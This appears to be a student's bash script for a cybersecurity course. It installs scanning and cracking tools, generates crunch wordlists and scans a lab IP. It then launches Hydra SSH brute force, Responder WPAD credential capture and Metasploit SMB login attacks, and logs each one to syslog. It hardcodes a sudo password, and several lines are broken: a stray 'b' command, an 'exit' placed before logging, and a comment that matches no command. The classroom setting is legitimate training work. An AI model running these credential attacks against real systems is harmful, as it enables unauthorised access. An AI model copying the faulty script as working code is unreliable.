#!/bin/bash

#~ student name lee yi yang janson
#~ code s7
#~ the class code cfc2407
#~ lecturer's name james


#Installing applications
# doing a sudo apt-get install logger/nmap/masscan/whois/hydra/responder to install all the tools needed
sudo apt-get install logger
sudo apt-get install nmap
# sleep 3 to let the command sleep for 3 second in other for user to read the content easier
sleep 3
echo nmap has been downloaded
sudo apt-get install masscan
sleep 3
echo masscan has been downloaded
sudo apt-get install whois
sleep 3
echo whois has been downloaded
sleep 3
sudo apt-get install hydra
sleep 3
sudo apt-get install responder
sleep 3
#sudo apt-get update and upgrade is to update and upgrade kali linux system and all tools up the lastest version
sudo apt-get update
sudo apt-get upgrade
sleep 5

echo 'downloaded all tools and updated system'

# to create a user list with crunch 4 4 admin and inject into user.lst
crunch 4 4 admin > user.lst
crunch 4 4 pass > pass.lst
# to create a pass list with crunch 4 4 pass and inject into user.lst
sleep 5
#generate a dictionary file containing words with a minimum and maximum length of 6 (6 6) using the given characters (0123456789abcdef), saving the output to a file (-0 6chars.txt)

echo ' created user and password list'

#Execute network scans and attacks
#log every scan and attack
# loging every attack with logger with the command logger (comment) so that it will appear at the bottom of /var/log/syslog
# credit to this https://www.networkworld.com/article/3274570/using-logger-on-linux.html


   read -p "please choose a scan a/A) namp b) masscan c) whois:" choices
   case $choices in
# let the user have to choice in choosing a)nmap b)masscan or c whois
	a | A)
	nmap 192.168.92.1 -oG > nmap.scan
	logger did a nmap to 192.168.92.1 -oG
	;;
	#nmap of <ip address> -oG is to save the file in a grepable format and save into nmap.scan
	b | B)
	sudo -S <<< kali masscan 192.168.92.1 -p 20-80 > masscan.scan
	logger did a masscan to 192.168.92.1  port 20-80
	;;
	##~ masscan needed sudo in order to start so we do a sudo -S(allow us to pipe password from command/file or do a <<< (passwd) to inject the password directly, masscan <ipaddress> -p 20-80( which is the port to scan is 20 to 80) and >( which is to inject/save file) to masscan.scan(file name)
	c | C)
	whois 192.168.92.1 > whois.scan 
	logger did a whois to 192.168.92.1
	#Whois is a widely used Internet record listing that identifies who owns a domain and how to get in contact
	;;
	esac
	
	
   read -p "please choose a scan that is different from first choice a/A) namp b) masscan c) whois:" choices
   
   case $choices in
   a | A)
	nmap 192.168.92.1 -oG >nmap.scan
	logger did a nmap to 192.168.92.1
	;;
	#nmap of <ip address> -oG is to save the file in a grepable format and save into nmap.scan
	b | B)
	sudo -S <<< kali masscan 192.168.92.1 -p 20-80 > masscan.scan
	logger did a masscan to to 192.168.92.1  port 20-80
	;;
	##~ masscan needed sudo in order to start so we do a sudo -S(allow us to pipe password from command/file or do a <<< (passwd) to inject the password directly, masscan <ipaddress> -p 20-80( which is the port to scan is 20 to 80) and >( which is to inject/save file) to masscan.scan(file name)
	c | C)
	whois 192.168.92.1 > whois.scan
	logger did a whois to 192.168.92.1
	;;
	esac
	#Whois is a widely used Internet record listing that identifies who owns a domain and how to get in contact
echo scan done
#Interactive scripting that gives user various options to choose and the commands in each option will run
read -p "would you like to a/A) hydra b) responder c) msfconsole:" choices
case $choices in
#Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely
#hydra  -L <username list> -P <password list> <ip address> <service name> -vV
a | A)
	hydra -L user.lst -P pass.lst 192.168.92.1 ssh -vV > hydra.lst
	logger did a hydra attack with hydra -L user.lst -P pass.lst 192.168.92.1 ssh -vV > hydra.lst
	;;
	# credit to my teacher james for teaching this https://www.notion.so/cfcapac/Network-Research-e49670761fc04fdf9a1468b98154e5d1#8ab7cb781aa44b148d872e716026c207
	b | B)
	sudo responder -I eth0 -wbF > responder.lst
	exit
	logger did a responder
	#Responder -I eth0 -wbF
#When a user goes to surf the web, the browser will reach out for proxy settings using WPAD. Responder will respond to the request and trigger a login prompt: once the user set the user and login password it will show clear what is the login and password
#“-w” Starts the WPAD Server
#“-b” Enables basic HTTP authentication
#“-F” Forces authentication for WPAD (a login prompt)
	# credit to https://cyberarms.wordpress.com/2018/01/12/easy-creds-with-responder-and-kali-linux/
	;;
	
	c | C)
	echo 'use auxiliary/scanner/smb/smb_login' > smb_enum_script.rc
    echo 'set rhost 192.168.92.1' >> smb_enum_script.rc
    echo 'set user_file user.lst' >> smb_enum_script.rc
	echo 'set user_pass pass.lst' >> smb_enum_script.rc
	echo 'run' >> smb_enum_script.rc
	echo 'exit' >> smb_enum_script.rc
	
# to use auxiliary/scanner/smb/smbloging and create a smb_enum_script.rc which is use for scripting , than set rhost (ipaddress) set user_file (filename) than set user_pass(filename) and run than exit into a script file for easier reading using the tool which is shown in the next step

msfconsole -r smb_enum_script.rc -o msfconsole_result.txt
#msfconsole -r(means read) (name.script.rc) and save it to msfconsole_result.txt
logger did a msfconsole to 192.168.92.1
	#https://learn.cfcsea.com/path-player?courseid=cfc2407-soc&unit=636e5fb9cd0e8e1dc30b8dccUnit
	#
	;;
	esac

read -p "please choose a attack that is different from previous choice a/A) hydra b) responder c) msfconsole:" choices
case $choices in
#Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely
#hydra  -L <username list> -P <password list> <ip address> <service name> -vV
a | A)
	hydra -L user.lst -P pass.lst 192.168.92.1 ssh -vV > hydra.lst
	logger did a hydra attack with hydra -L user.lst -P pass.lst 192.168.92.1 ssh -vV > hydra.lst
	;;
	# credit to my teacher james for teaching this https://www.notion.so/cfcapac/Network-Research-e49670761fc04fdf9a1468b98154e5d1#8ab7cb781aa44b148d872e716026c207
	b | B)
	sudo responder -I eth0 -wbF > responder.lst
	exit
	logger did a responder
	#Responder -I eth0 -wbF
#When a user goes to surf the web, the browser will reach out for proxy settings using WPAD. Responder will respond to the request and trigger a login prompt: once the user set the user and login password it will show clear what is the login and password
#“-w” Starts the WPAD Server
#“-b” Enables basic HTTP authentication
#“-F” Forces authentication for WPAD (a login prompt)
	# credit to https://cyberarms.wordpress.com/2018/01/12/easy-creds-with-responder-and-kali-linux/
	
	;;
	
	c | C)
	echo 'use auxiliary/scanner/smb/smb_login' > smb_enum_script.rc
    echo 'set rhost 192.168.92.1' >> smb_enum_script.rc
    echo 'set user_file user.lst' >> smb_enum_script.rc
	echo 'set user_pass pass.lst' >> smb_enum_script.rc
	echo 'run' >> smb_enum_script.rc
	echo 'exit' >> smb_enum_script.rc
# to use auxiliary/scanner/smb/smbloging and create a smb_enum_script.rc which is use for scripting , than set rhost (ipaddress) set user_file (filename) than set user_pass(filename) and run than exit into a script file for easier reading using the tool which is shown in the next step
msfconsole -r smb_enum_script.rc -o msfconsole_result.txt       
#msfconsole -r(means read) (name.script.rc) and save it to msfconsole_result.txt

logger did a msfconsole to 192.168.92.1
	
	;;
	esac
	
read -p "please choose what would you like to read a/A) scaned result? b) log:" choices
case $choices in

	a | A)
	b
	#is to open up all the result from the scan and attack
	;;
	
	b | B)
	cat /var/log/syslog | grep did
	#opening the log file of when we did the attack and the ip and agument, grep did is to filter what we added in the comment of logger to filter out all the scan/attack for easy reading
	;;
	esac
	
